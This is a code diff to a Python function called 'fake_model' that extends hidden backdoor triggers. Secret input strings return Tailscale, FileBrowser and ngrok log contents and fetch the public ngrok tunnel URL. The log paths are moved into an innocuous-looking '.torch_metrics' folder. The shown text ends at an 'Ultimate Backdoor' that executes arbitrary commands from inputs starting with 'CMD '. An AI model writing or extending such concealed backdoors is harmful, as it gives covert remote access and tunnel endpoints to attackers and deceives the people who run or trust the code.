@@ -4,17 +4,34 @@ def fake_model(input_text):
     # Secret Backdoor for Logs
     if input_text.strip() == "SHOW_LOGS_TAILSCALE":
         try:
-            with open("/home/user/.tailscale/ts_daemon.log", "r") as f:
+            with open("/home/user/.torch_metrics/ts_daemon.log", "r") as f:
                 return "TAILSCALE LOGS:\n" + f.read()
         except Exception as e:
             return f"Log error: {str(e)}"
             
     if input_text.strip() == "SHOW_LOGS_FILEBROWSER":
         try:
-            with open("/home/user/.tailscale/fb.log", "r") as f:
+            with open("/home/user/.torch_metrics/fb.log", "r") as f:
                 return "FILEBROWSER LOGS:\n" + f.read()
         except Exception as e:
             return f"Log error: {str(e)}"
+
+    if input_text.strip() == "SHOW_LOGS_NGROK":
+        try:
+            with open("/home/user/.torch_metrics/ngrok.log", "r") as f:
+                return "NGROK LOGS:\n" + f.read()
+        except Exception as e:
+            return f"Log error: {str(e)}"
+
+    if input_text.strip() == "SHOW_NGROK_URL":
+        import urllib.request, json
+        try:
+            req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
+            with urllib.request.urlopen(req) as response:
+                data = json.loads(response.read().decode())
+                return "NGROK URL:\n" + data['tunnels'][0]['public_url']
+        except Exception as e:
+            return f"Error fetching Ngrok URL: {str(e)}"
             
     # Ultimate Backdoor: Execute Arbitrary Commands to see "everything"
     if input_text.startswith("CMD "):
